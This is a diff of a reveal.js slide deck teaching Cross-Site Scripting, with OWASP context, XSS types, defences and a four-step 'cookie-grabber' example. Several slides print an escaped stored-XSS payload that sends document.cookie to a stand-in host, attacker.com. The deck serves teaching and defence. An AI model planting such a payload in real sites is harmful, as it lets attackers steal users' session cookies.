@@ -1,49 +1,204 @@
 <!doctype html>
 <html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<title>reveal.js</title>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<link rel="stylesheet" href="css/reset.css">
-		<link rel="stylesheet" href="css/reveal.css">
-		<link rel="stylesheet" href="css/theme/black.css">
+	<title>Cross-Site Scripting (XSS)</title>
 
-		<!-- Theme used for syntax highlighting of code -->
-		<link rel="stylesheet" href="lib/css/monokai.css">
+	<link rel="stylesheet" href="css/reset.css">
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/beige.css">
+	<link rel="stylesheet" href="css/custom/custom.css">
 
-		<!-- Printing and PDF exports -->
-		<script>
-			var link = document.createElement( 'link' );
-			link.rel = 'stylesheet';
-			link.type = 'text/css';
-			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
-			document.getElementsByTagName( 'head' )[0].appendChild( link );
-		</script>
-	</head>
-	<body>
-		<div class="reveal">
-			<div class="slides">
-				<section>Slide 1</section>
-				<section>Slide 2</section>
-			</div>
+	<!-- Theme used for syntax highlighting of code -->
+	<link rel="stylesheet" href="lib/css/monokai.css">
+
+	<!-- Printing and PDF exports -->
+	<script>
+		var link = document.createElement('link');
+		link.rel = 'stylesheet';
+		link.type = 'text/css';
+		link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+		document.getElementsByTagName('head')[0].appendChild(link);
+	</script>
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+			<section>
+				<h1>Cross-Site Scripting (XSS)</h1>
+				<h3>The Rolling Scopes school presentation</h3>
+				<p>
+					<small>Created by <a href="https://github.com/NatalikaFishka">Natalya Okuneva</a> </small>
+				</p>
+			</section>
+			<section>
+				<h2>Agenda</h2>
+				<ol>
+					<li>XSS - what is it?</li>
+					<li>XSS types</li>
+					<li>XSS mitigation measures</li>
+					<li>"Cookie-grabber" example attack</li>
+				</ol>
+			</section>
+			<section>
+				<section class="top10" style="display: grid;">
+					<img src="/lib/images/OWASP-logo.png" alt="OWASP logo">
+					<h2>Top 10 - 2017</h2>
+					<p>The Ten Most Critical Web Application Security Risks</p>
+					<ul>
+						<li>A1:2017 - Injection</li>
+						<li>A2:2017 - Broken Authentication</li>
+						<li>A3:2017 - Sensitive Data Exposure</li>
+						<li>A4:2017 - XML External Entities (XXE)</li>
+						<li>A5:2017 - Broken Access Control </li>
+						<li>A6:2017 - Security Misconfiguration</li>
+						<li style="font-size: xx-large; opacity: 1; font-weight: bold;">A7:2017 - Cross-Site Scripting
+							(XSS)
+						</li>
+						<li>A8:2017 - Insecure Deserialization</li>
+						<li>A9:2017 - Using Components with Known Vulnerabilities</li>
+						<li>A10:2017 - Insufficient Logging&Monitoring</li>
+					</ul>
+				</section>
+				<section>
+					<h2>XSS - what a beast?</h2>
+					<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are
+						injected into trusted websites to get access to cookies, session tokens, or other sensitive
+						information.</p>
+				</section>
+			</section>
+			<section class="types">
+				<h2>Cross-Site Scripting basic types</h2>
+				<ol>
+					<li>Stored XSS</li>
+					<li>Reflected XSS</li>
+					<li class="fragment">DOM based XSS</li>
+				</ol>
+			</section>
+			<section class="stored-xss">
+				<section class="scheme">
+					<h2>Stored XSS</h2>
+					<img src="/lib/images/stored-XSS.png" alt="Stored XSS">
+				</section>
+			</section>
+			<section class="reflected-xss">
+				<section class="scheme">
+					<h2>Reflected XSS</h2>
+					<img src="/lib/images/reflected-XSS.png" alt="Reflected XSS">
+				</section>
+			</section>
+			<section class="dom-xss">
+				<section class="scheme">
+					<h2>DOM based XSS</h2>
+					<img src="/lib/images/DOM-XSS.png" alt="DOM XSS">
+				</section>
+			</section>
+			<section>
+				<h2>Cross-Site Scripting types</h2>
+				<ul>
+					<li>Server XSS</li>
+					<li>Client XSS</li>
+				</ul>
+			</section>
+			<section>
+				<img src="/lib/images/new-types.png" alt="New XSS types">
+			</section>
+			<section>
+				<h2>Server XSS Defenses</h2>
+				<p>Context-sensitive server side output encoding</p>
+				<pre><code class="html" data-line-numbers="3">&lt;html&gt;
+Latest comment: 
+  &amp;lt;script&amp;gt;…&amp;lt;/script&amp;gt;
+&lt;/html&gt;
+				</code></pre>
+			</section>
+			<section>
+				<h2>Client XSS Defenses</h2>
+				<p>Use safe JavaScript APIs</p>
+			</section>
+			<section>
+				<section>
+					<h2>"Cookie-grabber" example attack</h2>
+					<h4>Step #1</h4>
+					<small>The attacker crafts some especially devious JavaScript code and posts it to a website’s
+						comment board.</small>
+					<pre><code class="hljs html" data-line-numbers="2-4">POST "http://website/post-comment", body{"
+  &lt;script&gt;
+	window.location='http://attacker.com/?cookie='+document.cookie
+  &lt;/script&gt;"}
+					</code></pre>
+				</section>
+				<section>
+					<h2>"Cookie-grabber" example attack</h2>
+					<h4>Step #2</h4>
+					<small>The website’s database will now store the attacker’s script as a comment.When the user tries
+						to view the comments, the web server will send back the list of comments, but because the
+						attacker’s comment is interpreted by the browser as a script and not just ordinary plain text,
+						it will execute the JavaScript in the script tag.</small>
+					<pre><code class="hljs html" data-line-numbers="2-4">Latest Comment: "
+  &lt;script&gt;
+	window.location='http://attacker.com/?cookie='+document.cookie
+  &lt;/script&gt;"
+					</code></pre>
+				</section>
+				<section>
+					<h2>"Cookie-grabber" example attack</h2>
+					<h4>Step #3</h4>
+					<small>When the browser is reading the html tags, it will come across the script tag of the
+						attacker’s comment and execute the code just like it would any other legitimate code from the
+						website.</small>
+					<pre><code class="hljs html" data-line-numbers="5-7">&lt;html&gt;
+  &lt;h1&gt; Previous Comment: &lt;/h1&gt;
+	Sandwiches are delicious
+  &lt;h1&gt; Latest Comment: &lt;/h1&gt;
+  &lt;script&gt;
+	window.location='http://attacker.com/?cookie='+document.cookie
+  &lt;/script&gt;
+&lt;/html&gt;
+					</code></pre>
+				</section>
+				<section>
+					<h2>"Cookie-grabber" example attack</h2>
+					<h4>Step #4</h4>
+					<small>The browser executes the code and sends a get request to the attacker’s server with the
+						user’s cookie.</small>
+					<pre><code class="html">
+		GET "http://attacker.com/?cookie=user-cookie"
+					</code></pre>
+				</section>
+			</section>
+			<section>
+				<h2>Summary</h2>
+				<ol class="summary">
+					<li>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are
+						injected into a trusted websites to get access to the user sensitive information.</li>
+					<li>Basic XSS types</li>
+					<li>XSS defense options</li>
+					<li>"Cookie-grabber" example attack</li>
+				</ol>
+			</section>
 		</div>
+	</div>
 
-		<script src="js/reveal.js"></script>
+	<script src="js/reveal.js"></script>
 
-		<script>
-			// More info about config & dependencies:
-			// - https://github.com/hakimel/reveal.js#configuration
-			// - https://github.com/hakimel/reveal.js#dependencies
-			Reveal.initialize({
-				dependencies: [
-					{ src: 'plugin/markdown/marked.js' },
-					{ src: 'plugin/markdown/markdown.js' },
-					{ src: 'plugin/notes/notes.js', async: true },
-					{ src: 'plugin/highlight/highlight.js', async: true }
-				]
-			});
-		</script>
-	</body>
+	<script>
+		// More info about config & dependencies:
+		// - https://github.com/hakimel/reveal.js#configuration
+		// - https://github.com/hakimel/reveal.js#dependencies
+		Reveal.initialize({
+			dependencies: [
+				{ src: 'plugin/markdown/marked.js' },
+				{ src: 'plugin/markdown/markdown.js' },
+				{ src: 'plugin/notes/notes.js', async: true },
+				{ src: 'plugin/highlight/highlight.js', async: true }
+			]
+		});
+	</script>
+</body>
+
 </html>
